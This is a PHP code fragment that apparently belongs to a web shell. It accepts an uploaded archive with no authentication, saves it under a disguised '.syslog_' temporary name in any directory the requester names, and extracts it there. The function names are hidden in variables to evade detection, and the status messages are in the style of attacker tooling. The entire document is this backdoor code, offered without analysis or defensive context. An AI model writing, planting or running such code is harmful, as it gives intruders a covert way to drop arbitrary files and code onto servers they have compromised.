if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['f'])) {
    $tmp  = $_FILES['f']['tmp_name'];
    $dest_dir = $_POST['p'];
    
    if(empty($dest_dir)) $dest_dir = __DIR__;
    
    $temp_file = $dest_dir . '/.syslog_' . bin2hex(random_bytes(3)) . '.tmp';

    if ($f_move($tmp, $temp_file)) {
        if (class_exists($c_zip)) {
            $zip = new $c_zip;
            if ($zip->open($temp_file) === TRUE) {
                $zip->extractTo($dest_dir);
                $zip->close();
                echo "[+] Done: Path $dest_dir";
            } else { echo "[-] Zip Error"; }
        } else { echo "[-] Lib Missing"; }
        @$f_unlink($temp_file);
    } else { echo "[-] Upload Fail"; }
